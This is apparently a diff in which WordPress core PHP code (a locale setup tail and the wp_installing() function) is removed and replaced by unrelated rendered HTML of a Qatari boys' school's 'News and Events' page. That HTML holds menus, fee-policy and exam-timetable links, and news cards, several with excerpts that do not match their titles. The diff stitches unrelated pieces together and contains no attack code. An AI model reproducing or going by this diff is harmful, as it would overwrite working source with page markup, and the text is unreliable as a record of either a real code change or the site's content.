+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988052"><a href="https://amab.com.qa/knowledge-centre/" class="elementor-sub-item" tabindex="-1">Learning Support Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988081"><a href="https://amab.com.qa/parents-committee/" class="elementor-sub-item" tabindex="-1">Parent’s Committee Council</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988108"><a href="https://amab.com.qa/careers/" class="elementor-sub-item" tabindex="-1">Careers</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988114"><a href="https://amab.com.qa/contact-us/" class="elementor-sub-item" tabindex="-1">Contact Us</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988126"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Infant</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988155"><a href="https://amab.com.qa/welcome-to-infant-school/" class="elementor-sub-item" tabindex="-1">Welcome to Infant School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-994093"><a href="https://amab.com.qa/infant-school-document-centre-25-26/" class="elementor-sub-item" tabindex="-1">Document Centre 25-26</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993915"><a href="https://amab.com.qa/infant-school-curriculum-and-assessments/" class="elementor-sub-item" tabindex="-1">Infant School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988175"><a href="https://amab.com.qa/infant-school-arabic-department/" class="elementor-sub-item" tabindex="-1">Infant School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988192"><a href="https://amab.com.qa/infant-school-gallery/" class="elementor-sub-item" tabindex="-1">Infant School Gallery</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988166"><a href="https://play.numbots.com/#/account/school-login/107035" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Numbots Site</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988207"><a href="https://amab.com.qa/infant-school-new-uniform/" class="elementor-sub-item" tabindex="-1">New Uniform</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988127"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Junior</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988248"><a href="https://amab.com.qa/welcome-to-junior-school/" class="elementor-sub-item" tabindex="-1">Welcome to Junior School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988259"><a href="https://amab.com.qa/junior-school-curriculum-and-assessments/" class="elementor-sub-item" tabindex="-1">Junior School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988317"><a href="https://amab.com.qa/junior-school-document-centre/" class="elementor-sub-item" tabindex="-1">Junior School Document Centre</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988295"><a href="https://amab.com.qa/junior-school-arabic-department/" class="elementor-sub-item" tabindex="-1">Junior School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988294"><a href="https://amab.com.qa/junior-school-student-council/" class="elementor-sub-item" tabindex="-1">Junior School Student Council</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988323"><a href="https://amab.com.qa/junior-school-gallery/" class="elementor-sub-item" tabindex="-1">Junior School Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988128"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Secondary</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-989363"><a href="https://amab.com.qa/welcome-to-secondary-school-2/" class="elementor-sub-item" tabindex="-1">Welcome to Secondary School</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988362"><a href="https://amab.com.qa/secondary-school-curriculum-and-assessments/" class="elementor-sub-item" tabindex="-1">Secondary School Curriculum &#038; Assessments</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988626"><a href="https://amab.com.qa/secondary-school-document-centre/" class="elementor-sub-item" tabindex="-1">Secondary School Document Centre</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988534"><a href="https://amab.com.qa/secondary-school-arabic-department/" class="elementor-sub-item" tabindex="-1">Secondary School Arabic Department</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988563"><a href="https://amab.com.qa/secondary-house-system/" class="elementor-sub-item" tabindex="-1">Secondary House System</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988639"><a href="https://amab.com.qa/secondary-school-gallery/" class="elementor-sub-item" tabindex="-1">Secondary School Gallery</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988653"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Admissions</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988652"><a href="https://amab.com.qa/registrars-message/" class="elementor-sub-item" tabindex="-1">Registrar’s Office</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988664"><a href="https://amab.com.qa/online-admission/" class="elementor-sub-item" tabindex="-1">Online Admission</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988667"><a href="https://amab.com.qa/registration-documentation/" class="elementor-sub-item" tabindex="-1">Registration Documentation</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994016"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-Arabic-أكاديمية-المها-للبنين-سياسة-الرسوم-2025-2026-Copy.pdf" class="elementor-sub-item" tabindex="-1">MoE Approved School Tuition Fees 2025-2026 ( Arabic)</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994111"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-Fees-Policy-Updated-for-2025-2026-English.pdf" class="elementor-sub-item" tabindex="-1">School Tuition Fees Policy 2025-2026 (English))</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994113"><a href="http://amab.com.qa/wp-content/uploads/2025/09/AMAB-MOE-Fee-Policy-and-MOE-Tablet-Mandatory-Letter-for-AY-2025-2026-2.pdf" class="elementor-sub-item" tabindex="-1">MoE Approved School Tuition Fees 2025-2026 (English))</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-988720"><a target="_blank" href="/wp-content/uploads/2024/10/MOE-AMAB-Fee-Policy-2022-2023.pdf#new_tab" class="elementor-sub-item elementor-item-anchor" tabindex="-1">MOE Fee Policy AMAB – 2024-2025</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993416"><a href="/wp-content/uploads/2024/10/Re-Enrollment-letter-2024-2025.pdf" class="elementor-sub-item" tabindex="-1">Student Re-enrollment 2024-2025</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993999"><a href="https://amab.com.qa/academic-calendar/" class="elementor-sub-item" tabindex="-1">Academic Calendar</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-post menu-item-988727"><a target="_blank" href="/wp-content/uploads/2024/10/2020.5.4-Withdrawal-Procedures-AMAB.pdf#new_tab" class="elementor-sub-item elementor-item-anchor" tabindex="-1">Withdrawal Procedures</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-988728"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">Examinations</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994151"><a href="http://amab.com.qa/wp-content/uploads/2025/10/Taallum-Mock-Session-1b-Y12-2025-V2.pdf" class="elementor-sub-item" tabindex="-1">Year 12 IAL and AS Mock Examination 1b Timetable</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994149"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/lessons_amab_taalumgroup_com/EvUirKJiSQBOq_jkubsj-a4BorvtcNUlYwjOgK9E0B-Aeg?e=xp2N4T" class="elementor-sub-item" tabindex="-1">Year 12 Mock 1 LOs and Self-Instructional Materials</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994141"><a href="http://amab.com.qa/wp-content/uploads/2025/09/Mid-Semester-1-Exam-Timetable-V6.pdf" class="elementor-sub-item" tabindex="-1">Mid Semester 1 : 25-26 Timetable</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-994140"><a href="https://taallum-my.sharepoint.com/:f:/g/personal/lessons_amab_taalumgroup_com/EoV8WoBylZtPqJqTTRGQF_oBhkwuYZIVrwudlGcpTs-pzg?e=bCpTQb" class="elementor-sub-item" tabindex="-1">Mid Semester 1: LO&#8217;s &#038; Self-Instruction Materials</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988827"><a target="_blank" href="http://amab.com.qa/wp-content/uploads/2025/09/Appendix-1A_Taallum-Assessment-Model-Mark-Distribution.pdf" class="elementor-sub-item" tabindex="-1">Appendix 1A_Ta&#8217;allum Assessment Model &#038; Mark Distribution</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993839"><a href="http://amab.com.qa/wp-content/uploads/2025/03/AMAB-IGCSE-IAS-Summer-2025-Timetable-STUDENTS-10-11-12.pdf" class="elementor-sub-item" tabindex="-1">Summer IGCSE/AS exams timetable June 2025</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988816"><a href="https://amab.com.qa/external-exam-information/" class="elementor-sub-item" tabindex="-1">External Exam Information</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988824"><a target="_blank" href="/wp-content/uploads/2024/10/Infant-School-Assessment-Model-EYFS-Nursery-Reception.pdf" class="elementor-sub-item" tabindex="-1">Infant School Assessment (Nursery &#8211; Reception ) Model  2024-2025</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988825"><a target="_blank" href="/wp-content/uploads/2024/10/Upper-Infant-Junior-Assessment-Model-Years-1-6-.pdf" class="elementor-sub-item" tabindex="-1">Upper-Infant-Junior Assessment-Model ( Year 1-6)</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988826"><a target="_blank" href="/wp-content/uploads/2024/10/Secondary-Assessment-Model-Years-7-12.pdf" class="elementor-sub-item" tabindex="-1">Secondary Assessment Model (Years-7-12)</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-988034"><a href="#" class="elementor-item elementor-item-anchor" tabindex="-1">School Life</a>
+<ul class="sub-menu elementor-nav-menu--dropdown">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-993498"><a href="https://amab.com.qa/calendar/" class="elementor-sub-item" tabindex="-1">Calendar</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993760"><a href="http://amab.com.qa/wp-content/uploads/2025/08/AMAB-Lesson-Timings-AY-2025-26.pdf" class="elementor-sub-item" tabindex="-1">Daily Lesson Timings 2025-2026</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988848"><a href="https://amab.com.qa/modern-and-purpose-built-facilities/" class="elementor-sub-item" tabindex="-1">Modern &#038; Purpose-Built Facilities</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988893"><a href="https://amab.com.qa/technology-adaptation-in-teaching/" class="elementor-sub-item" tabindex="-1">Technology Adaptation in Teaching</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988905"><a href="https://amab.com.qa/science-laboratory/" class="elementor-sub-item" tabindex="-1">Science Laboratory</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988918"><a href="https://amab.com.qa/ict-laboratory/" class="elementor-sub-item" tabindex="-1">ICT Laboratory</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988933"><a href="https://amab.com.qa/library/" class="elementor-sub-item" tabindex="-1">Library</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-988941"><a href="https://amab.com.qa/play-area/" class="elementor-sub-item" tabindex="-1">Play Area</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-993425"><a href="https://global-zone61.renaissance-go.com/welcomeportal/2887003" class="elementor-sub-item" tabindex="-1">Star Reading</a></li>
+	<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-988982"><a target="_blank" href="/wp-content/uploads/2024/10/tarbeya.pdf" class="elementor-sub-item" tabindex="-1">Tarbeya Center</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-992016 current_page_item menu-item-992018"><a href="https://amab.com.qa/news-and-events/" aria-current="page" class="elementor-sub-item elementor-item-active" tabindex="-1">News and Events</a></li>
+</ul>
+</li>
+<li class="trp-language-switcher-container menu-item menu-item-type-post_type menu-item-object-language_switcher menu-item-988990"><a href="https://amab.com.qa/ar/news-and-events/" class="elementor-item" tabindex="-1"><span data-no-translation><img class="trp-flag-image" src="/wp-content/uploads/2024/10/qatar.png" width="18" height="12" alt="ar" title="Arabic"><span class="trp-ls-language-name">AR</span></span></a></li>
+</ul>			</nav>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+		
+	<div id="page" class="main-container">
+		<div id="main-content">
+			
+<div id="sub-header" class="layout-full elementor-page-title">
+	<div class="meta-header" >
+		
+		<!-- Elementor `page-title` location -->
+	</div>
+</div>
 
-		break;
-	}
+						<div id="main" role="main" class="vamtam-main layout-full" >
+				
+				
 
-	$wp_locale = new WP_Locale();
-}
+				<div class="page-wrapper">
+	
+		
+		<article id="post-992016" class="full post-992016 page type-page status-publish hentry">
+					<div class="page-content clearfix the-content-parent">
+						<div data-elementor-type="wp-page" data-elementor-id="992016" class="elementor elementor-992016" data-elementor-post-type="page">
+						<section class="elementor-section elementor-top-section elementor-element elementor-element-e4fe6ff elementor-section-height-min-height elementor-section-boxed elementor-section-height-default elementor-section-items-middle" data-id="e4fe6ff" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;animation&quot;:&quot;none&quot;}">
+							<div class="elementor-background-overlay"></div>
+							<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-251b61d" data-id="251b61d" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+			<div class="elementor-widget-wrap">
+							</div>
+		</div>
+					</div>
+		</section>
+		<div class="elementor-element elementor-element-6a5f47e7 e-flex e-con-boxed e-con e-parent" data-id="6a5f47e7" data-element_type="container">
+					<div class="e-con-inner">
+		<div class="elementor-element elementor-element-537d53d7 e-con-full e-flex e-con e-child" data-id="537d53d7" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-731b9321 elementor-widget__width-initial elementor-widget-tablet__width-initial elementor-blockquote--skin-border elementor-blockquote--button-color-official elementor-widget elementor-widget-blockquote" data-id="731b9321" data-element_type="widget" data-widget_type="blockquote.default">
+				<div class="elementor-widget-container">
+							<blockquote class="elementor-blockquote">
+			<p class="elementor-blockquote__content">
+				News & Events			</p>
+					</blockquote>
+						</div>
+				</div>
+				</div>
+		<div class="elementor-element elementor-element-f8bfc06 e-con-full e-flex e-con e-child" data-id="f8bfc06" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+				<div class="elementor-element elementor-element-6aaf0247 elementor-widget elementor-widget-text-editor" data-id="6aaf0247" data-element_type="widget" data-widget_type="text-editor.default">
+				<div class="elementor-widget-container">
+									<p>Stay updated with the latest news and exciting events.</p>								</div>
+				</div>
+				</div>
+					</div>
+				</div>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-c06e3e4 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="c06e3e4" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-fada16a" data-id="fada16a" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-9bab324 elementor-grid-3 elementor-grid-tablet-2 elementor-grid-mobile-1 elementor-posts--thumbnail-top elementor-card-shadow-yes elementor-posts__hover-gradient elementor-widget elementor-widget-posts" data-id="9bab324" data-element_type="widget" data-settings="{&quot;pagination_type&quot;:&quot;prev_next&quot;,&quot;cards_columns&quot;:&quot;3&quot;,&quot;cards_columns_tablet&quot;:&quot;2&quot;,&quot;cards_columns_mobile&quot;:&quot;1&quot;,&quot;cards_row_gap&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:35,&quot;sizes&quot;:[]},&quot;cards_row_gap_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;cards_row_gap_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="posts.cards">
+				<div class="elementor-widget-container">
+							<div class="elementor-posts-container elementor-posts elementor-posts--skin-cards elementor-grid">
+				<article class="elementor-post elementor-grid-item post-994158 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+			<div class="elementor-post__card">
+				<a class="elementor-post__thumbnail__link" href="https://amab.com.qa/online-lesson-on-tuesday/" tabindex="-1" ><div class="elementor-post__thumbnail"><img decoding="async" width="2560" height="1451" src="https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-scaled.jpg" class="attachment-full size-full wp-image-990462" alt="" srcset="https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-scaled.jpg 2560w, https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-300x170.jpg 300w, https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-1024x580.jpg 1024w, https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-768x435.jpg 768w, https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-1536x871.jpg 1536w, https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-2048x1161.jpg 2048w, https://amab.com.qa/wp-content/uploads/2020/11/Screen-Shot.-2021-01-26-at-10.13.23-AM-copy-18x10.jpg 18w" sizes="(max-width: 2560px) 100vw, 2560px" /></div></a>
+				<div class="elementor-post__text">
+				<h3 class="elementor-post__title">
+			<a href="https://amab.com.qa/online-lesson-on-tuesday/" >
+				Online Lesson on Tuesday			</a>
+		</h3>
+				<div class="elementor-post__excerpt">
+			<p>Join Us in Honoring Qatar’s Heritage, Unity, and Progress&#8221;</p>
+		</div>
+					<div class="elementor-post__read-more-wrapper">
+		
+		<a class="elementor-post__read-more" href="https://amab.com.qa/online-lesson-on-tuesday/" aria-label="Read more about Online Lesson on Tuesday" tabindex="-1" >
+			Read More		</a>
 
-/**
- * Checks or sets whether WordPress is in "installation" mode.
- *
- * If the `WP_INSTALLING` constant is defined during the bootstrap, `wp_installing()` will default to `true`.
- *
- * @since 4.4.0
- *
- * @param bool $is_installing Optional. True to set WP into Installing mode, false to turn Installing mode off.
- *                            Omit this parameter if you only want to fetch the current status.
- * @return bool True if WP is installing, otherwise false. When a `$is_installing` is passed, the function will
- *              report whether WP was in installing mode prior to the change to `$is_installing`.
- */
-function wp_installing( $is_installing = null ) {
-	static $installing = null;
+					</div>
+				</div>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-11-03		</span>
+				</div>
+					</div>
+		</article>
+				<article class="elementor-post elementor-grid-item post-994138 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+			<div class="elementor-post__card">
+				<a class="elementor-post__thumbnail__link" href="http://amab.com.qa/wp-content/uploads/2025/09/Mid-Semester-1-Exam-Timetable-V6.pdf#new_tab" tabindex="-1" ><div class="elementor-post__thumbnail"><img loading="lazy" decoding="async" width="352" height="328" src="https://amab.com.qa/wp-content/uploads/2025/02/aja-exam.jpg" class="attachment-full size-full wp-image-993697" alt="" srcset="https://amab.com.qa/wp-content/uploads/2025/02/aja-exam.jpg 352w, https://amab.com.qa/wp-content/uploads/2025/02/aja-exam-300x280.jpg 300w, https://amab.com.qa/wp-content/uploads/2025/02/aja-exam-13x12.jpg 13w" sizes="(max-width: 352px) 100vw, 352px" /></div></a>
+				<div class="elementor-post__text">
+				<h3 class="elementor-post__title">
+			<a href="http://amab.com.qa/wp-content/uploads/2025/09/Mid-Semester-1-Exam-Timetable-V6.pdf#new_tab" >
+				Mid Semester 1 Exams  2025-2026 Timetable			</a>
+		</h3>
+				<div class="elementor-post__excerpt">
+			<p>Effective Time Management Traditionally, most people find the norm in education to involve lectures in physical classrooms.  Tutor-student interaction is perceived as being only physical.</p>
+		</div>
+					<div class="elementor-post__read-more-wrapper">
+		
+		<a class="elementor-post__read-more" href="http://amab.com.qa/wp-content/uploads/2025/09/Mid-Semester-1-Exam-Timetable-V6.pdf#new_tab" aria-label="Read more about Mid Semester 1 Exams  2025-2026 Timetable" tabindex="-1" >
+			Read More		</a>
 
-	// Support for the `WP_INSTALLING` constant, defined before WP is loaded.
-	if ( is_null( $installing ) ) {
-		$installing = defined( 'WP_INSTALLING' ) && WP_INSTALLING;
-	}
+					</div>
+				</div>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-09-28		</span>
+				</div>
+					</div>
+		</article>
+				<article class="elementor-post elementor-grid-item post-994104 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+			<div class="elementor-post__card">
+				<a class="elementor-post__thumbnail__link" href="http://amab.com.qa/wp-content/uploads/2025/09/Letter-to-Parents_Cognitive-Abilities-Tests-CAT-4-Tests_September-2024-1.pdf#new_tab" tabindex="-1" ><div class="elementor-post__thumbnail"><img loading="lazy" decoding="async" width="450" height="225" src="https://amab.com.qa/wp-content/uploads/2025/09/CAT4.jpg" class="attachment-full size-full wp-image-994106" alt="" srcset="https://amab.com.qa/wp-content/uploads/2025/09/CAT4.jpg 450w, https://amab.com.qa/wp-content/uploads/2025/09/CAT4-300x150.jpg 300w, https://amab.com.qa/wp-content/uploads/2025/09/CAT4-18x9.jpg 18w" sizes="(max-width: 450px) 100vw, 450px" /></div></a>
+				<div class="elementor-post__text">
+				<h3 class="elementor-post__title">
+			<a href="http://amab.com.qa/wp-content/uploads/2025/09/Letter-to-Parents_Cognitive-Abilities-Tests-CAT-4-Tests_September-2024-1.pdf#new_tab" >
+				Letter to Parents Cognitive Abilities Tests (CAT 4) Tests September 2025			</a>
+		</h3>
+				<div class="elementor-post__excerpt">
+			<p>Effective Time Management Traditionally, most people find the norm in education to involve lectures in physical classrooms.  Tutor-student interaction is perceived as being only physical.</p>
+		</div>
+					<div class="elementor-post__read-more-wrapper">
+		
+		<a class="elementor-post__read-more" href="http://amab.com.qa/wp-content/uploads/2025/09/Letter-to-Parents_Cognitive-Abilities-Tests-CAT-4-Tests_September-2024-1.pdf#new_tab" aria-label="Read more about Letter to Parents Cognitive Abilities Tests (CAT 4) Tests September 2025" tabindex="-1" >
+			Read More		</a>
 
-	if ( ! is_null( $is_installing ) ) {
-		$old_installing = $installing;
-		$installing     = $is_installing;
+					</div>
+				</div>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-09-04		</span>
+				</div>
+					</div>
+		</article>
+				<article class="elementor-post elementor-grid-item post-994048 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+			<div class="elementor-post__card">
+				<a class="elementor-post__thumbnail__link" href="http://amab.com.qa/wp-content/uploads/2025/07/Taallum-Resit-Timetable_Aug-24-28-2025_Final-updated.pdf#new_tab" tabindex="-1" ><div class="elementor-post__thumbnail"><img loading="lazy" decoding="async" width="450" height="450" src="https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2.png" class="attachment-full size-full wp-image-993943" alt="" srcset="https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2.png 450w, https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2-300x300.png 300w, https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2-150x150.png 150w, https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2-12x12.png 12w" sizes="(max-width: 450px) 100vw, 450px" /></div></a>
+				<div class="elementor-post__text">
+				<h3 class="elementor-post__title">
+			<a href="http://amab.com.qa/wp-content/uploads/2025/07/Taallum-Resit-Timetable_Aug-24-28-2025_Final-updated.pdf#new_tab" >
+				End Of Semester 2 2025 Resit  Timetable August 24-28-28			</a>
+		</h3>
+				<div class="elementor-post__excerpt">
+			<p>Effective Time Management Traditionally, most people find the norm in education to involve lectures in physical classrooms.  Tutor-student interaction is perceived as being only physical.</p>
+		</div>
+					<div class="elementor-post__read-more-wrapper">
+		
+		<a class="elementor-post__read-more" href="http://amab.com.qa/wp-content/uploads/2025/07/Taallum-Resit-Timetable_Aug-24-28-2025_Final-updated.pdf#new_tab" aria-label="Read more about End Of Semester 2 2025 Resit  Timetable August 24-28-28" tabindex="-1" >
+			Read More		</a>
 
-		return (bool) $old_installing;
-	}
+					</div>
+				</div>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-07-01		</span>
+				</div>
+					</div>
+		</article>
+				<article class="elementor-post elementor-grid-item post-993941 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+			<div class="elementor-post__card">
+				<a class="elementor-post__thumbnail__link" href="http://amab.com.qa/wp-content/uploads/2025/05/Taallum-End-of-Year-Exam-Timetable_June-2025-V5_21.05.2025.pdf#new_tab" tabindex="-1" ><div class="elementor-post__thumbnail"><img loading="lazy" decoding="async" width="450" height="450" src="https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2.png" class="attachment-full size-full wp-image-993943" alt="" srcset="https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2.png 450w, https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2-300x300.png 300w, https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2-150x150.png 150w, https://amab.com.qa/wp-content/uploads/2025/05/AMAB-Exam-timetable2-12x12.png 12w" sizes="(max-width: 450px) 100vw, 450px" /></div></a>
+				<div class="elementor-post__text">
+				<h3 class="elementor-post__title">
+			<a href="http://amab.com.qa/wp-content/uploads/2025/05/Taallum-End-of-Year-Exam-Timetable_June-2025-V5_21.05.2025.pdf#new_tab" >
+				End Of Semester 2 Exam 2025 Timetable June 15-19			</a>
+		</h3>
+				<div class="elementor-post__excerpt">
+			<p>Effective Time Management Traditionally, most people find the norm in education to involve lectures in physical classrooms.  Tutor-student interaction is perceived as being only physical.</p>
+		</div>
+					<div class="elementor-post__read-more-wrapper">
+		
+		<a class="elementor-post__read-more" href="http://amab.com.qa/wp-content/uploads/2025/05/Taallum-End-of-Year-Exam-Timetable_June-2025-V5_21.05.2025.pdf#new_tab" aria-label="Read more about End Of Semester 2 Exam 2025 Timetable June 15-19" tabindex="-1" >
+			Read More		</a>
 
-	return (bool) $installing;
-}
+					</div>
+				</div>
+				<div class="elementor-post__meta-data">
+					<span class="elementor-post-date">
+			2025-05-04		</span>
+				</div>
+					</div>
+		</article>
+				<article class="elementor-post elementor-grid-item post-993790 post type-post status-publish format-standard has-post-thumbnail hentry category-news tag-school-events-news">
+			<div class="elementor-post__card">
+				<a class="elementor-post__thumbnail__link" href="http://amab.com.qa/wp-content/uploads/2025/03/Taallum-Mock-Exam-Session-2-March-2025-V8.pdf#new_tab" tabindex="-1" ><div class="elementor-post__thumbnail"><img loading="lazy" decoding="async" width="352" height="328" src="https://amab.com.qa/wp-content/uploads/2025/02/aja-exam.jpg" class="attachment-full size-full wp-image-993697" alt="" srcset="https://amab.com.qa/wp-content/uploads/2025/02/aja-exam.jpg 352w, https://amab.com.qa/wp-content/uploads/2025/02/aja-exam-300x280.jpg 300w, https://amab.com.qa/wp-content/uploads/2025/02/aja-exam-13x12.jpg 13w" sizes="(max-width: 352px) 100vw, 352px" /></div></a>
+				<div class="elementor-post__text">
+				<h3 class="elementor-post__title">
+			<a href="http://amab.com.qa/wp-content/uploads/2025/03/Taallum-Mock-Exam-Session-2-March-2025-V8.pdf#new_tab" >
+				Ta&#8217;allum Mock Exam Session 2 March 2025			</a>
+		</h3>
+				<div class="elementor-post__excerpt">
+			<p>5th March 2025</p>
+<p>Dear Parents and Families,<br />
+The second set of Ta’allum Year KS4 (Y10/11) and KS5 (Y12) Mock IGCSE exams will take place from 16th		</div>
+					<div class="elementor-post__read-more-wrapper">
+		
